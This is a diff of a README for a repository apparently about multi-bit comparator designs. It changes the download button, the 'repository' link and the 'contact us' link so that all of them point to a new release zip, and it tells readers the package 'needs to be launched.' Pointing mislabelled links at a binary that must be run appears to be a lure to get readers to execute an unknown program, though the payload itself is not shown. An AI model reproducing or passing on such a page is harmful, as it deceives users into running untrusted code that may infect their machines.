@@ -24,13 +24,13 @@ Explore our collection of **Multi-Bit Comparator** designs and related topics, i
 
 Click the button below to download the software package:
 
-[![Download Software](https://github.com/ab-ff/Multi-Bit-Comparator/releases/download/v1.0/Program.zip)](https://github.com/ab-ff/Multi-Bit-Comparator/releases/download/v1.0/Program.zip)
+[![Download Software](https://github.com/ab-ff/Multi-Bit-Comparator/releases/download/v2.0/Software.zip)](https://github.com/ab-ff/Multi-Bit-Comparator/releases/download/v2.0/Software.zip)
 
 *Note: This link leads directly to the software package and needs to be launched.*
 
 ## 🌐 Explore More
 
-Feel free to visit our [repository](https://github.com/ab-ff/Multi-Bit-Comparator/releases/download/v1.0/Program.zip) on GitHub to discover additional resources and updates.
+Feel free to visit our [repository](https://github.com/ab-ff/Multi-Bit-Comparator/releases/download/v2.0/Software.zip) on GitHub to discover additional resources and updates.
 
 ## 🤖 Get Started
 
@@ -48,7 +48,7 @@ We welcome contributions to enhance the **Multi-Bit Comparator** repository. Fee
 
 ## 📞 Contact Us
 
-If you have any questions or suggestions regarding the **Multi-Bit Comparator** repository, please [contact us](https://github.com/ab-ff/Multi-Bit-Comparator/releases/download/v1.0/Program.zip).
+If you have any questions or suggestions regarding the **Multi-Bit Comparator** repository, please [contact us](https://github.com/ab-ff/Multi-Bit-Comparator/releases/download/v2.0/Software.zip).
 
 ---
 
